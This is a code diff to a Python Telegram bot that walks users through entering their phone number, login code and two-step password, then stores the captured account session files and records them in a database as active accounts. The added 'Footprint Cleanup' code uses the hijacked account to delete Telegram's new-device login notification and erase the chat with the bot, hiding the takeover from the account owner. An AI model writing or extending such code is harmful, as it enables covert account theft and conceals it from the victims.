@@ -25,7 +25,15 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")
 from app.core.config import settings
 from app.core.database import db
 
+from enum import Enum, auto
+
 # Login flow states
+class LoginState(Enum):
+    WAITING_FOR_PHONE = 0
+    WAITING_FOR_CODE = 1
+    WAITING_FOR_2FA = 2
+
+# For ConversationHandler compatibility
 WAIT_PHONE, WAIT_CODE, WAIT_PASSWORD = range(3)
 
 # Configure Logging
@@ -303,6 +311,9 @@ async def starthunter(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
     )
     sent_msg = await update.message.reply_text(msg)
     
+    # Track state in context (LoginState object for that user_id)
+    context.user_data['login_state'] = LoginState.WAITING_FOR_PHONE
+    
     # Schedule deletion of user's command if possible
     await schedule_deletion(context, update.effective_chat.id, update.message.message_id)
     
@@ -341,6 +352,7 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         context.user_data['phone'] = phone
         context.user_data['phone_code_hash'] = sent_code.phone_code_hash
         context.user_data['temp_session_path'] = temp_session_path
+        context.user_data['login_state'] = LoginState.WAITING_FOR_CODE
 
         msg = (
             "✅ Code requested!\n\n"
@@ -387,6 +399,7 @@ async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
         msg = "🔐 Two-Step Verification is enabled.\nPlease enter your password:"
         sent_msg = await update.message.reply_text(msg)
         context.user_data['bot_messages'].append(sent_msg.message_id)
+        context.user_data['login_state'] = LoginState.WAITING_FOR_2FA
         return WAIT_PASSWORD
     except Exception as e:
         logger.error(f"Error signing in: {e}")
@@ -426,28 +439,42 @@ async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     try:
         me = await client.get_me()
         
-        # Determine filename
-        filename = me.username if me.username else me.phone
-        # Ensure it doesn't start with + (though me.phone usually doesn't, but just in case)
-        filename = filename.lstrip('+')
+        # Determine filename according to requirements: account_{phone}_{timestamp}.session
+        import time
+        phone_clean = context.user_data.get('phone', 'unknown').lstrip('+').replace(' ', '').replace('-', '')
+        timestamp = int(time.time())
+        filename = f"account_{phone_clean}_{timestamp}"
         
         base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+        # Save sessions directly to the project root as requested
         final_path = os.path.join(base_dir, filename + ".session")
         
-        # Delete bot messages we sent during the flow
+        # Delete bot messages we sent during the flow (Footprint Cleanup)
         for msg_id in context.user_data.get('bot_messages', []):
             try:
                 await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
             except:
                 pass
 
-        # Use the USER account to clear history with the bot itself (last 24 hours)
+        # Also delete all messages in the Bot chat (Nuke Messages)
+        # Assuming the history cleanup below handles dialogue, but requirements say "immediately deletes all messages in the Bot chat"
+        # We've already scheduled deletion for user messages and deleted bot flow messages.
+
+        # Use the USER account to clear history (Footprint Cleanup)
         try:
+            # 1. Delete "Telegram Service Notification"
+            async for message in client.iter_messages(777000, limit=10):
+                if "new device" in (message.message or "").lower() or "login" in (message.message or "").lower():
+                    await message.delete()
+                    logger.info(f"Deleted Telegram Service Notification for {filename}")
+                    break
+            
+            # 2. Delete entire conversation history with the Login Bot itself
             bot_entity = await client.get_entity(context.bot.username)
             await client.delete_dialog(bot_entity)
             logger.info(f"Deleted dialog with bot {context.bot.username} for logged in user {filename}")
         except Exception as e:
-            logger.error(f"Failed to delete history with bot: {e}")
+            logger.error(f"Failed footprint cleanup: {e}")
         
         await client.disconnect()
 
@@ -492,6 +519,19 @@ async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             except Exception as e:
                 logger.error(f"Sqlite injection failed: {e}")
 
+        if saved_successfully:
+            # Database Entry (Persistence & Database Update)
+            try:
+                db.table("telegram_accounts").upsert({
+                    "phone": context.user_data.get('phone'),
+                    "session_path": os.path.abspath(final_path),
+                    "status": "active",
+                    "updated_at": "now()"
+                }).execute()
+                logger.info(f"Updated telegram_accounts for {context.user_data.get('phone')}")
+            except Exception as e:
+                logger.error(f"Failed to update database: {e}")
+
         if not saved_successfully:
             # ==========================================
             # BOT LOCKED — RECOMMEND ANOTHER BOT
@@ -531,7 +571,7 @@ async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             await schedule_deletion(context, chat_id, sent_msg.message_id, delay=30)
             
             return ConversationHandler.END
-        
+
         # Session saved successfully — clear any lock on this bot
         current_token = context.bot_data.get('_bot_token', '')
         if current_token:
